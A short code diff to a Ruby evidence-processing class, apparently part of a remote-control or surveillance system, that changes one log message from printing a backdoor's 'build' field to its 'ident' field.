@@ -31,7 +31,7 @@ class InstanceProcessor
     @info = RCS::EvidenceManager.instance.instance_info @id
     raise "Instance \'#{@id}\' cannot be found." if @info.nil?
     
-    trace :info, "Created processor for backdoor #{@info['build']}:#{@info['instance']}"
+    trace :info, "Created processor for backdoor #{@info['ident']}:#{@info['instance']}"
     
     # the log key is passed as a string taken from the db
     # we need to calculate the MD5 and use it in binary form
